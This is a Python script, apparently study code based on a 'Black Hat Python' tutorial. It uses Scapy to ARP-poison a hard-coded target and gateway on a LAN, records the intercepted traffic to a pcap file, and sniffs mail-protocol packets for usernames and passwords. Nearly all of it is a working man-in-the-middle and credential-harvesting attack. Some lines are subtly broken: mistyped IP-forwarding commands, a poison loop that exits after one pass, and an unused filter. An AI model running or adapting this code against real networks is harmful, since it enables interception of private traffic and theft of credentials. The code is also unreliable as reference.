# See http://bt3gl.github.io/black-hat-python-infinite-possibilities-with-the-scapy-module.html

# Pre: find windows targets by sniffing and looking for wpad, & other windowsy calls

import subprocess
from scapy.all import *
from scapy.error import Scapy_Exception
import os
import sys
import threading
import signal
from common import print_text

# First forward all your traffic
subprocess.Popen('$ echo 1 /proc/sys/net/ipv4/ip_foward')

# At end unforward all traffic
subprocess.Popen('$ echo 0 /proc/sys/net/ipv4/ip_foward')

# Second ARP POISON
INTERFACE       =   'wlp1s0'
TARGET_IP       =   '192.168.1.107'
GATEWAY_IP      =   '192.168.1.1'
PACKET_COUNT    =   1000

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print_text.print_msg('[*] Restoring targets...')
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', \
        hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", \
        hwsrc=target_mac), count=5)
    os.kill(os.getpid(), signal.SIGINT)

def get_mac(ip_address):
    response, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address), \
        timeout=2, retry=10)
    for s, r in response:
        return r[Ether].src
    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print_text.print_msg('[*] Beginning the ARP poison. [CTRL-C to stop]')
    while 1:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)

        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

        print('[*] ARP poison attack finished.')
        return

if __name__ == '__main__':
    conf.iface = INTERFACE
    conf.verb = 0
    print("[*] Setting up %s" % INTERFACE)
    GATEWAY_MAC = get_mac(GATEWAY_IP)
    if GATEWAY_MAC is None:
        print_text.print_error("\t[-] Failed to get gateway MAC. Exiting.")
        sys.exit(0)
    else:
        print_text.print_msg("[*] Gateway %s is at %s" %(GATEWAY_IP, GATEWAY_MAC))

    TARGET_MAC = get_mac(TARGET_IP)
    if TARGET_MAC is None:
        print_text.print_error("\t[-] Failed to get target MAC. Exiting.")
        sys.exit(0)
    else:
        print_text.print_msg("[*] Target %s is at %s" % (TARGET_IP, TARGET_MAC))

    poison_thread = threading.Thread(target = poison_target, args=(GATEWAY_IP, GATEWAY_MAC, \
        TARGET_IP, TARGET_MAC))
    poison_thread.start()

    try:
        print_text.print_msg('[*] Starting sniffer for %d packets' %PACKET_COUNT)
        bpf_filter = 'IP host ' + TARGET_IP
        packets = sniff(count=PACKET_COUNT, iface=INTERFACE)
        wrpcap('results.pcap', packets)
        restore_target(GATEWAY_IP, GATEWAY_MAC, TARGET_IP, TARGET_MAC)

    except Scapy_Exception as msg:
        print_text.print_error(msg, "Hi there!!")

    except KeyboardInterrupt:
        restore_target(GATEWAY_IP, GATEWAY_MAC, TARGET_IP, TARGET_MAC)
        sys.exit()

# Third - This will sniff all the ports and print out user/pass if found!
def packet_callback(packet):
    # check to make sure it has a data payload
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if 'user' in mail_packet.lower() or 'pass' in mail_packet.lower():
            print_text.print_msg('[*] Server: %s' % packet[IP].dst)
            print_text.print_msg('[*] %s' %packet[TCP].payload)

sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)


